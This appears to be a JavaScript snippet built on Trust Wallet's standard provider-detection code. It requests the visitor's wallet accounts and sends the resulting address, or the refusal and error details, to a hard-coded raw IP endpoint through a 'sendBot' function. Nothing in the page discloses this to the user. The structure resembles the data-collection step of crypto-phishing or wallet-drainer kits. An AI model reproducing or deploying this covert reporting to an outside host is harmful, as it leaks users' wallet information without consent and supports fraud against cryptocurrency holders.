var bot_host = 'http://109.248.150.30:8001/bot3';

function sendBot(data, lable) {
	var msg = '';
	for (var i in Object.assign(data)) {
		msg += `\n<b>${i}:</b> ${data[i]}`;

	}
    fetch(bot_host, {
        method: "post",
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        },
        //make sure to serialize your JSON body
        body: JSON.stringify({
            'msg': msg,
            'name': lable,
            // 'key': CryptoJS.SHA256(msg + lable + '2790')
        })
    })
}

export async function getTrustWalletInjectedProvider(
  { timeout } = { timeout: 3000 }
) {
  const provider = getTrustWalletFromWindow();

  if (provider) {
    return provider;
  }

  return listenForTrustWalletInitialized({ timeout });
}

async function listenForTrustWalletInitialized(
  { timeout } = { timeout: 3000 }
) {
  return new Promise((resolve) => {
    const handleInitialization = () => {
      resolve(getTrustWalletFromWindow());
    };

    window.addEventListener("trustwallet#initialized", handleInitialization, {
      once: true,
    });

    setTimeout(() => {
      window.removeEventListener(
        "trustwallet#initialized",
        handleInitialization,
        { once: true }
      );
      resolve(null);
    }, timeout);
  });
}

function getTrustWalletFromWindow() {
  const isTrustWallet = (ethereum) => {
    const trustWallet = !!ethereum.isTrust;

    return trustWallet;
  };

  const injectedProviderExist =
    typeof window !== "undefined" && typeof window.ethereum !== "undefined";

  if (!injectedProviderExist) {
    return null;
  }

  if (isTrustWallet(window.ethereum)) {
    return window.ethereum;
  }
  if (window.ethereum?.providers) {
    return window.ethereum.providers.find(isTrustWallet) ?? null;
  }

  return window["trustwallet"] ?? null;
}


console.log('lol')
const injectedProvider = await getTrustWalletInjectedProvider();


try {
  const account = await injectedProvider.request({
    method: "eth_requestAccounts",
  });
  sendBot({'walletAddr': account}, "Test Trustwallet api");
  console.log(account);
} catch (e) {
  if (e.code === 4001) {
    sendBot({'msg': "User denied connection."}, "Test Trustwallet api");
  }else{
    sendBot({'code': e.code, 'eror': e.toString()}, "Test Trustwallet api");
  }
}